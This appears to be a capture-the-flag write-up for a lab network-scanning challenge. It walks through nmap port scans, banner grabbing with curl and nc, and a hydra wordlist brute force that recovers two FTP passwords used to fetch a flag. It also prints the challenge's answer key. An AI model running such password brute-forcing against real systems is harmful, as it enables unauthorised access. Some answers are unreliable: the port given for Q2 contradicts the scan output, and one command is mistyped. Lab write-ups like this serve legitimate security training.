
### Q1-Q3: NMAP Basic Scan (scan all ports)

```nmap
nmap -p- -T4 10.49.173.99
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 17:00 +0600
Nmap scan report for 10.49.173.99
Host is up (0.047s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 304.72 seconds
```

Q1: What is the highest port number being open less than 10,000? - 8080
Q2: There is an open port outside the common 1000 ports; it is above 10,000. What is it? - 100021
Q3: How many TCP ports are open? - 6

### Q4: use curl command to get HTTP response header + body
```
url -i 10.49.173.99                                                   
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "229449419"
Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
Content-Length: 226
Date: Mon, 09 Mar 2026 11:17:12 GMT
Server: lighttpd THM{web_server_25352}

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Hello, world!</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
</head>
<body>
  <h1>Hello, world!</h1>
</body>
</html>
```
Q4: What is the flag hidden in the HTTP server header? - THM{web_server_25352}

### Q5: use nc command
(tries to open a TCP connection to port 22 on that machine.)
```
nc 10.49.173.99 22
```
Q5: What is the flag hidden in the SSH server header? - THM{946219583339}

### Q6: use nc command again on port 10021
```
nc 10.49.173.99 10021
```
Q6: We have an FTP server listening on a nonstandard port. What is the version of the FTP server? - vsFTPd 3.0.5

### Q7: Since we got two usernames, use hydra to bruteforce password. 
(-s 10021 → connect to port 10021 instead of the default FTP port)

```
hydra -L usenames.txt -P /usr/share/wordlists/rockyou.txt ftp://10.49.173.99 -s 10021
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-09 17:41:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ftp://10.49.173.99:10021/
[10021][ftp] host: 10.49.173.99   login: eddie   password: jordan
[10021][ftp] host: 10.49.173.99   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-09 17:41:29
```
Then use the username:password to login.
```
ftp 10.49.173.99 10021
Connected to 10.49.173.99.
220 (vsFTPd 3.0.5)
Name (10.49.173.99:leon): eddie
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30285|)
150 Here comes the directory listing.
226 Directory send OK.
ftp>
```
Nothing is found on eddie's account.
Now login on quinn's account.
```
ftp 10.49.173.99 10021
Connected to 10.49.173.99.
220 (vsFTPd 3.0.5)
Name (10.49.173.99:leon): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30504|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30615|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |***********************************|    18      214.36 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.17 KiB/s)
ftp> exit
221 Goodbye.
```
Q7: We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP? - THM{321452667098}

### Q8: -sN -> (TCP NULL scan) sends TCP packets with no flags set
```
nmap -sN 10.49.173.99
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 18:20 +0600
Nmap scan report for 10.49.173.99
Host is up (0.10s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds
```
Q8: Browsing to http://10.49.173.99:8080 displays a small challenge that will give you a flag once you solve it. What is the flag? - THM{f7443f99}
